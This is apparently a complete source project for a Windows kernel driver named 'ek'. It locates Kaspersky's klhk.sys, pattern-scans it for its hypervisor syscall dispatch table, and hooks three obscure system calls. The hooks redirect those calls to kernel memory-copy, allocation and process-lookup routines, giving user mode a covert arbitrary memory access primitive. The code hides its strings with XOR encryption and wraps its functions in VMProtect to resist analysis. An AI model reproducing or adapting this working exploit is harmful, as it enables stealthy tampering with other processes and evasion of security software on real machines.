  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
    <ClCompile>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <DisableSpecificWarnings>4996;%(DisableSpecificWarnings)</DisableSpecificWarnings>
      <InlineFunctionExpansion>OnlyExplicitInline</InlineFunctionExpansion>
    </ClCompile>
    <Link>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
      <AdditionalDependencies>VMProtectDDK64.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="defines.h" />
    <ClInclude Include="general.h" />
    <ClInclude Include="utils.h" />
    <ClInclude Include="vmp.h" />
    <ClInclude Include="xor.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ek/ek/ek.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="utils.cpp">
      <Filter>Source</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="general.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="vmp.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="xor.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="defines.h">
      <Filter>Source</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ek/ek/general.h`:

```h
#pragma once

#define VMP_MARKERS true

#include <ntifs.h>
#include <ntimage.h>
#include <minwindef.h>
#include <fltKernel.h>
#include <intrin.h>

#include "xor.h"
#include "defines.h"
#include "vmp.h"
#include "utils.h"

namespace global
{
	inline UCHAR* ShellcodeBase = nullptr;
	inline SIZE_T ShellcodeSize = 0;
	inline UCHAR OriginalCode[13];
	inline RTL_OSVERSIONINFOEXW VersionInfo = { 0 };
	inline PVOID NtTerminateThread = nullptr;
}

```

`ek/ek/main.cpp`:

```cpp
#include "general.h"

/*
 * Download beta version to get the latest driver:
 * https://eap.kaspersky.com/category/811
 */

using SetHvmEvent_t = NTSTATUS(*)();

static VOID*** systemDispatchArray;
static UINT* ssdtServiceCount;
static UINT* shadowSsdtServiceCount;
static UINT* provider;

UINT GetServiceCountSsdt()
{
	return ssdtServiceCount ? *ssdtServiceCount : 0;
}

UINT GetServiceCountShadow()
{
	return shadowSsdtServiceCount ? *shadowSsdtServiceCount : 0;
}

BOOL HookSsdtRoutine(USHORT index, VOID* dest, VOID** original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !dest || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt();
	if (!svcCount || index >= svcCount)
		return false;

	*original = *systemDispatchArray[index];
	*systemDispatchArray[index] = dest;

	PROTECT_END();
	return true;
}

BOOL UnhookSsdtRoutine(USHORT index, VOID* original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt();
	if (!svcCount || index >= svcCount || *systemDispatchArray[index] == original)
		return false;

	*systemDispatchArray[index] = original;

	PROTECT_END();
	return true;
}

BOOL HookShadowSsdtRoutine(USHORT index, VOID* dest, VOID** original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !dest || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt(), svcCountShadowSsdt = GetServiceCountShadow();
	if (!svcCount || !svcCountShadowSsdt)
		return false;

	UINT indexDispatchTable = (index - 0x1000) + svcCount;
	UINT dispatchTableLimit = svcCount + svcCountShadowSsdt;
	if (indexDispatchTable >= dispatchTableLimit)
		return false;

	*original = *systemDispatchArray[indexDispatchTable];
	*systemDispatchArray[indexDispatchTable] = dest;

	PROTECT_END();
	return true;
}

BOOL UnhookShadowSsdtRoutine(USHORT index, VOID* original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt(), svcCountShadowSsdt = GetServiceCountShadow();
	if (!svcCount || !svcCountShadowSsdt)
		return false;

	UINT indexDispatchTable = (index - 0x1000) + svcCount;
	UINT dispatchTableLimit = svcCount + svcCountShadowSsdt;
	if (indexDispatchTable >= dispatchTableLimit || *systemDispatchArray[indexDispatchTable] == original)
		return false;

	*systemDispatchArray[indexDispatchTable] = original;

	PROTECT_END();
	return true;
}

PVOID GetRoutine(PCWSTR targetRoutine)
{
	PROTECT_ULTRA();
	UNICODE_STRING routineName;
	RtlInitUnicodeString(&routineName, targetRoutine);

	PROTECT_END();
	return MmGetSystemRoutineAddress(&routineName);
}

NTSTATUS UpdateSyscallIndexes()
{
	PROTECT_ULTRA();
	RTL_OSVERSIONINFOEXW versionInfo = { 0 };
	versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);

	NTSTATUS status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&versionInfo));
	if (!NT_SUCCESS(status))
		return STATUS_VERSION_QUERY_FAIL;

	// Windows 10 21H2
	if (versionInfo.dwBuildNumber == 19044)
	{
		indexes::NtCreateProfileExIndex = 187;
		indexes::NtSetBootEntryOrderIndex = 391;
		indexes::NtSetBootOptionsIndex = 392;
		return STATUS_SUCCESS;
	}

	// Windows 10 22H2
	if (versionInfo.dwBuildNumber == 19045)
	{
		indexes::NtCreateProfileExIndex = 187;
		indexes::NtSetBootEntryOrderIndex = 391;
		indexes::NtSetBootOptionsIndex = 392;
		return STATUS_SUCCESS;
	}

	// Windows 11 22H2
	if (versionInfo.dwBuildNumber == 22621)
	{
		indexes::NtCreateProfileExIndex = 193;
		indexes::NtSetBootEntryOrderIndex = 404;
		indexes::NtSetBootOptionsIndex = 405;
		return STATUS_SUCCESS;
	}

	PROTECT_END();
	return STATUS_UNSUPPORTED_VERSION;
}

extern "C" NTSTATUS DriverEntry(VOID * driver, VOID * registry)
{
	PROTECT_ULTRA();
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(registry);

	NTSTATUS status = UpdateSyscallIndexes();
	if (!NT_SUCCESS(status))
		return status;

	PVOID MmCopyVirtualMemoryPtr = GetRoutine(EW(L"MmCopyVirtualMemory"));
	if (!MmCopyVirtualMemoryPtr)
		return STATUS_IMPORT_NOT_FOUND;

	PVOID ExAllocatePoolPtr = GetRoutine(EW(L"ExAllocatePool"));
	if (!ExAllocatePoolPtr)
		return STATUS_IMPORT_NOT_FOUND;

	PVOID PsLookupProcessByProcessIdPtr = GetRoutine(EW(L"PsLookupProcessByProcessId"));
	if (!PsLookupProcessByProcessIdPtr)
		return STATUS_IMPORT_NOT_FOUND;

	PCHAR kasperskyBase = utils::FindTargetModule(E("klhk.sys"));
	if (!kasperskyBase)
		return STATUS_KASPERSKY_BASE_NOT_FOUND;

	SetHvmEvent_t setHvmEvent = reinterpret_cast<SetHvmEvent_t>(utils::FindPatternImage(kasperskyBase, EC("\x48\x83\xEC\x38\x48\x83\x3D"), EC("xxxxxxx")));
	if (!setHvmEvent)
		return STATUS_SCAN_0_NOT_FOUND;

	PCHAR scan = static_cast<PCHAR>(utils::FindPatternSection(kasperskyBase, EC("_hvmcode"), EC("\x4C\x8D\x0D\x00\x00\x00\x00\x4D"), EC("xxx????x")));
	if (!scan)
		return STATUS_SCAN_1_NOT_FOUND;

	systemDispatchArray = reinterpret_cast<VOID***>(scan + *reinterpret_cast<INT*>(scan + 0x3) + 0x7);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x89\x0D\x00\x00\x00\x00\x8B\xFB"), EC("xx????xx")));
	if (!scan)
		return STATUS_SCAN_2_NOT_FOUND;

	ssdtServiceCount = reinterpret_cast<UINT*>(scan + *reinterpret_cast<INT*>(scan + 0x2) + 0x6);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x89\x05\x00\x00\x00\x00\x8B\xFB"), EC("xx????xx")));
	if (!scan)
		return STATUS_SCAN_3_NOT_FOUND;

	shadowSsdtServiceCount = reinterpret_cast<UINT*>(scan + *reinterpret_cast<INT*>(scan + 0x2) + 0x6);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x39\x2D\x00\x00\x00\x00\x75"), EC("xx????x")));
	if (!scan)
		return STATUS_SCAN_4_NOT_FOUND;

	provider = reinterpret_cast<unsigned int*>(scan + *reinterpret_cast<int*>(scan + 0x2) + 0x6);

	*provider = 4;
	status = setHvmEvent();
	if (!NT_SUCCESS(status))
		return status;

	VOID* dummy = nullptr;
	bool hooked = HookSsdtRoutine(indexes::NtSetBootEntryOrderIndex, PsLookupProcessByProcessIdPtr, &dummy);
	if (!hooked)
		return STATUS_HOOK_0_FAILED;

	hooked = HookSsdtRoutine(indexes::NtSetBootOptionsIndex, ExAllocatePoolPtr, &dummy);
	if (!hooked)
		return STATUS_HOOK_1_FAILED;

	hooked = HookSsdtRoutine(indexes::NtCreateProfileExIndex, MmCopyVirtualMemoryPtr, &dummy);
	if (!hooked)
		return STATUS_HOOK_2_FAILED;

	PROTECT_END();
	return STATUS_SUCCESS;
}
```

`ek/ek/utils.cpp`:

```cpp
#include "general.h"

PCHAR utils::FindTargetModule(const char* inputName)
{
	PROTECT_ULTRA();
	void* buffer = ExAllocatePool(NonPagedPool, 8);
	if (!buffer)
		return nullptr;

	ULONG bufferSize = 0;
	NTSTATUS status = imports::ZwQuerySystemInformation(enums::SystemModuleInformationClass, buffer, bufferSize, &bufferSize);
	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		ExFreePool(buffer);

		buffer = ExAllocatePool(NonPagedPool, bufferSize);
		status = imports::ZwQuerySystemInformation(enums::SystemModuleInformationClass, buffer, bufferSize, &bufferSize);
	}

	if (!NT_SUCCESS(status))
	{
		ExFreePool(buffer);
		return nullptr;
	}

	structs::PRTL_PROCESS_MODULES modules = static_cast<structs::PRTL_PROCESS_MODULES>(buffer);

	for (ULONG i = 0; i < modules->NumberOfModules; ++i)
	{
		const char* moduleName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

		if (strcmp(moduleName, inputName) == 0)
		{
			PCHAR result = static_cast<PCHAR>(modules->Modules[i].ImageBase);

			ExFreePool(buffer);
			return result;
		}
	}

	ExFreePool(buffer);
	PROTECT_END();
	return nullptr;
}

BOOL utils::CheckMask(PCHAR base, PCHAR pattern, PCHAR mask)
{
	for (; *mask; ++base, ++pattern, ++mask)
	{
		if (*mask == 'x' && *base != *pattern)
			return FALSE;
	}

	return TRUE;
}

PVOID utils::FindPattern(PCHAR base, DWORD length, PCHAR pattern, PCHAR mask)
{
	PROTECT_MUTATE();
	length -= static_cast<DWORD>(strlen(mask));
	for (DWORD i = 0; i <= length; ++i)
	{
		PVOID addr = &base[i];
		if (CheckMask(static_cast<PCHAR>(addr), pattern, mask))
		{
			return addr;
		}
	}

	PROTECT_END();
	return 0;
}

PVOID utils::FindPatternImage(PCHAR base, PCHAR pattern, PCHAR mask)
{
	PROTECT_MUTATE();
	PVOID match = 0;

	PIMAGE_NT_HEADERS headers = reinterpret_cast<PIMAGE_NT_HEADERS>(base + reinterpret_cast<PIMAGE_DOS_HEADER>(base)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (*reinterpret_cast<PINT>(section->Name) == 'EGAP' || memcmp(section->Name, ".text", 5) == 0)
		{
			match = FindPattern(base + section->VirtualAddress, section->Misc.VirtualSize, pattern, mask);
			if (match)
				break;
		}
	}

	PROTECT_END();
	return match;
}

PVOID utils::FindPatternSection(PCHAR base, PCHAR sectionName, PCHAR pattern, PCHAR mask)
{
	PROTECT_MUTATE();
	PVOID match = 0;

	PIMAGE_NT_HEADERS headers = reinterpret_cast<PIMAGE_NT_HEADERS>(base + reinterpret_cast<PIMAGE_DOS_HEADER>(base)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, 5) == 0)
		{
			match = FindPattern(base + section->VirtualAddress, section->Misc.VirtualSize, pattern, mask);
			if (match)
				break;
		}
	}

	PROTECT_END();
	return match;
}
```

`ek/ek/utils.h`:

```h
#pragma once

namespace utils
{
	PCHAR FindTargetModule(const char* inputName);
	BOOL CheckMask(PCHAR base, PCHAR pattern, PCHAR mask);
	PVOID FindPattern(PCHAR base, DWORD length, PCHAR pattern, PCHAR mask);
	PVOID FindPatternImage(PCHAR base, PCHAR pattern, PCHAR mask);
	PVOID FindPatternSection(PCHAR base, PCHAR sectionName, PCHAR pattern, PCHAR mask);
}
```

`ek/ek/vmp.h`:

```h
#pragma once

#define VMP_IMPORT __declspec(dllimport)
#define VMP_API __stdcall
#define VMP_WCHAR wchar_t
#ifdef _WIN64
#pragma comment(lib, "VMProtectDDK64.lib")
#else
#pragma comment(lib, "VMProtectDDK32.lib")
#endif // _WIN64

#ifdef __cplusplus
extern "C" {
#endif

	// protection
	VMP_IMPORT void VMP_API VMProtectBegin(const char*);
	VMP_IMPORT void VMP_API VMProtectBeginVirtualization(const char*);
	VMP_IMPORT void VMP_API VMProtectBeginMutation(const char*);
	VMP_IMPORT void VMP_API VMProtectBeginUltra(const char*);
	VMP_IMPORT void VMP_API VMProtectBeginVirtualizationLockByKey(const char*);
	VMP_IMPORT void VMP_API VMProtectBeginUltraLockByKey(const char*);
	VMP_IMPORT void VMP_API VMProtectEnd(void);

	// utils
	VMP_IMPORT BOOLEAN VMP_API VMProtectIsProtected();
	VMP_IMPORT BOOLEAN VMP_API VMProtectIsDebuggerPresent(BOOLEAN); // IRQL = PASSIVE_LEVEL
	VMP_IMPORT BOOLEAN VMP_API VMProtectIsVirtualMachinePresent(void); // IRQL = PASSIVE_LEVEL
	VMP_IMPORT BOOLEAN VMP_API VMProtectIsValidImageCRC(void);
	VMP_IMPORT const char* VMP_API VMProtectDecryptStringA(const char* value);
	VMP_IMPORT const VMP_WCHAR* VMP_API VMProtectDecryptStringW(const VMP_WCHAR* value);
	VMP_IMPORT BOOLEAN VMP_API VMProtectFreeString(const void* value);

	// licensing
	enum VMProtectSerialStateFlags
	{
		SERIAL_STATE_SUCCESS = 0,
		SERIAL_STATE_FLAG_CORRUPTED = 0x00000001,
		SERIAL_STATE_FLAG_INVALID = 0x00000002,
		SERIAL_STATE_FLAG_BLACKLISTED = 0x00000004,
		SERIAL_STATE_FLAG_DATE_EXPIRED = 0x00000008,
		SERIAL_STATE_FLAG_RUNNING_TIME_OVER = 0x00000010,
		SERIAL_STATE_FLAG_BAD_HWID = 0x00000020,
		SERIAL_STATE_FLAG_MAX_BUILD_EXPIRED = 0x00000040,
	};

#pragma pack(push, 1)
	typedef struct
	{
		unsigned short	wYear;
		unsigned char	bMonth;
		unsigned char	bDay;
	} VMProtectDate;

	typedef struct
	{
		int				nState;				// VMProtectSerialStateFlags
		VMP_WCHAR		wUserName[256];		// user name
		VMP_WCHAR		wEMail[256];		// email
		VMProtectDate	dtExpire;			// date of serial number expiration
		VMProtectDate	dtMaxBuild;			// max date of build, that will accept this key
		int				bRunningTime;		// running time in minutes
		unsigned char	nUserDataLength;	// length of user data in bUserData
		unsigned char	bUserData[255];		// up to 255 bytes of user data
	} VMProtectSerialNumberData;
#pragma pack(pop)

	VMP_IMPORT int VMP_API VMProtectSetSerialNumber(const char* serial);
	VMP_IMPORT int VMP_API VMProtectGetSerialNumberState();
	VMP_IMPORT BOOLEAN VMP_API VMProtectGetSerialNumberData(VMProtectSerialNumberData* data, int size);
	VMP_IMPORT int VMP_API VMProtectGetCurrentHWID(char* hwid, int size);

	// activation
	enum VMProtectActivationFlags
	{
		ACTIVATION_OK = 0,
		ACTIVATION_SMALL_BUFFER,
		ACTIVATION_NO_CONNECTION,
		ACTIVATION_BAD_REPLY,
		ACTIVATION_BANNED,
		ACTIVATION_CORRUPTED,
		ACTIVATION_BAD_CODE,
		ACTIVATION_ALREADY_USED,
		ACTIVATION_SERIAL_UNKNOWN,
		ACTIVATION_EXPIRED,
		ACTIVATION_NOT_AVAILABLE
	};

	VMP_IMPORT int VMP_API VMProtectActivateLicense(const char* code, char* serial, int size);
	VMP_IMPORT int VMP_API VMProtectDeactivateLicense(const char* serial);
	VMP_IMPORT int VMP_API VMProtectGetOfflineActivationString(const char* code, char* buf, int size);
	VMP_IMPORT int VMP_API VMProtectGetOfflineDeactivationString(const char* serial, char* buf, int size);

#ifdef __cplusplus
}
#endif

#if VMP_MARKERS
#define PROTECT_ULTRA() VMProtectBeginUltra(nullptr)
#define PROTECT_MUTATE() VMProtectBeginMutation(nullptr)
#define PROTECT_END() VMProtectEnd()
#else
#define PROTECT_ULTRA()
#define PROTECT_MUTATE()
#define PROTECT_END()
#endif
```

`ek/ek/xor.h`:

```h
#pragma once

// =============================================================================
namespace crypt {
	// =============================================================================

	// convert __TIME__ == "hh:mm:ss" to a sum of seconds this gives us a compile-time seed
	// Note: in some weird cases I've seen the seed being different from encryption
	// to decryption so it's safer to not use time and set the seed manually
#if 1
#define TBX_XSTR_SEED ((__TIME__[7] - '0') * 1ull    + (__TIME__[6] - '0') * 10ull  + \
                       (__TIME__[4] - '0') * 60ull   + (__TIME__[3] - '0') * 600ull + \
                       (__TIME__[1] - '0') * 3600ull + (__TIME__[0] - '0') * 36000ull)
#else
#define TBX_XSTR_SEED (3600ull)
#endif

// -----------------------------------------------------------------------------

// @return a pseudo random number clamped at 0xFFFFFFFF
	constexpr unsigned long long linear_congruent_generator(unsigned rounds) {
		return 1013904223ull + (1664525ull * ((rounds > 0) ? linear_congruent_generator(rounds - 1) : (TBX_XSTR_SEED))) % 0xFFFFFFFF;
	}

	// -----------------------------------------------------------------------------

#define Random() linear_congruent_generator(10)
#define XSTR_RANDOM_NUMBER(Min, Max) (Min + (Random() % (Max - Min + 1)))

// -----------------------------------------------------------------------------

	constexpr const unsigned long long XORKEY = XSTR_RANDOM_NUMBER(0, 0xFF);

	// -----------------------------------------------------------------------------

	template<typename Char >
	constexpr Char encrypt_character(const Char character, int index) {
		return character ^ (Char)(static_cast<Char>(XORKEY) + index);
	}

	// -----------------------------------------------------------------------------

	template <unsigned size, typename Char>
	class Xor_string {
	public:
		const unsigned _nb_chars = (size - 1);
		Char _string[size];

		// if every goes alright this constructor should be executed at compile time
		inline constexpr Xor_string(const Char* string)
			: _string{}
		{
			for (unsigned i = 0u; i < size; ++i)
				_string[i] = encrypt_character<Char>(string[i], i);
		}

		// This is executed at runtime.
		// HACK: although decrypt() is const we modify '_string' in place
		const Char* decrypt() const
		{
			Char* string = const_cast<Char*>(_string);
			for (unsigned t = 0; t < _nb_chars; t++) {
				string[t] = string[t] ^ (Char)(static_cast<Char>(XORKEY) + t);
			}
			string[_nb_chars] = '\0';
			return string;
		}
	};
}// END crypt NAMESPACE ========================================================

#define XorS(name, my_string)    constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> name(my_string)
#define XorString(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> expr(my_string); return expr; }().decrypt()

#define E( string ) XorString( string )
#define EC(string) (PCHAR)E(string)

#define XorWS(name, my_string)       constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> name(my_string)
#define XorWideString(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> expr(my_string); return expr; }().decrypt()

#define EW( string ) XorWideString( string )
```